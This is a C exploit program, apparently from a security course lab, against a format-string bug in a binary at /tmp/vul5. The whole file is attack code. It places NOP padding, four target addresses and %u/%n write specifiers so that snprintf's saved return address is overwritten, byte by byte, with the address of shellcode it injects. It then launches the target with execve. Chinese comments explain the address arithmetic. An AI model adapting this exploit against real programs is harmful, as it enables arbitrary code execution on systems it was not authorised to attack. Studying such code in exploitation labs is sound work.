#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul5"

int main(void)
{
    char payload[400];
    memset(payload, 0x90, 400);

    unsigned int buf_addr = 0xffffdb3c;
    //! 进入 snprintf 函数后 esp 存放其返回地址，我们只需要将其修改为 shellcode 地址
    unsigned int snprintf_return_addr = 0xffffdb2c;
    char *format_string =
        "\xff\xff\xff\xff\x2c\xdb\xff\xff" //! 修改 0xffffdb2c 的值
        "\xff\xff\xff\xff\x2d\xdb\xff\xff" //! 修改 0xffffdb2d 的值
        "\xff\xff\xff\xff\x2e\xdb\xff\xff" //! 修改 0xffffdb2e 的值
        "\xff\xff\xff\xff\x2f\xdb\xff\xff" //! 修改 0xffffdb2f 的值
        //! arg 的起始地址为 0xffffde5d
        //! 修改为 0xffffdf3d，应该只要指向 shellcode 前面就可以
        "%29u%n"   //! 29 + 32 = 0x3d 
        "%162u%n"  //! 0x3d + 162 = 0xdf
        "%32u%n"   //! 0xdf + 32 = 0xff
        "%256u%n"; //! 0xff + 256 = 0x1ff 
    memcpy(payload, format_string, strlen(format_string));
    unsigned int shellcode_offset = strlen(format_string) + 200;

    memcpy(payload + shellcode_offset, shellcode, strlen(shellcode));

    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
